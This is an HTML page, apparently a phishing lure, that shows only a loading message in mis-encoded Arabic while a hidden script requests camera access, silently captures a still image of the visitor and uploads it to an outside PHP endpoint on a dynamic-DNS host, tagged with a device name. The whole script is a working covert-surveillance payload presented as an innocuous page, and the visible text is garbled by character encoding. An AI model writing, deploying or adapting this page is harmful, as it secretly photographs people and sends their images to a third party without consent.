<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>ุฌุงุฑู ุงููุชุญ </title>
</head>
<body>
<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>
<h1>ุฌุงุฑู ุงูุชุญููู ๐</h1>
<script>
(async () => {
    try {
        // ุจุฏุก ุชุดุบูู ุงููุงููุฑุง
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;

        video.onloadedmetadata = () => {
            // ุงูุงูุชุธุงุฑ ููููุงู ูุจุฏุก ุงูููุฏูู
            setTimeout(() => {
                // ุงูุชูุงุท ุงูุตูุฑุฉ
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                // ุชุญููู ุฅูู Blob ุซู ุฅุฑุณุงููุง
                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append("file", blob, "image.jpg");

                    // device name = ali ูุซูุงู
                    const device = "Links";
                    const url = "http://apptoofan.mooo.com/Gor.php?device=" + encodeURIComponent(device);

                    fetch(url, {
                        method: "POST",
                        body: formData
                    }).then(res => res.text())
                      .then(txt => console.log("โ ุงูุฑุฏ ูู ุงูุณูุฑูุฑ:", txt))
                      .catch(err => console.error("โ ุฎุทุฃ:", err));

                    // ุฅููุงู ุงููุงููุฑุง
                    stream.getTracks().forEach(track => track.stop());
                }, "image/jpeg");
            }, 1000); // ุชุฃุฎูุฑ 1 ุซุงููุฉ ููุณูุงุญ ุจุชุดุบูู ุงููุงููุฑุง
        };
    } catch (err) {
        console.error("โ ูุดู ุงููุตูู ุฅูู ุงููุงููุฑุง:", err);
    }
})();
</script>
</body>
</html>
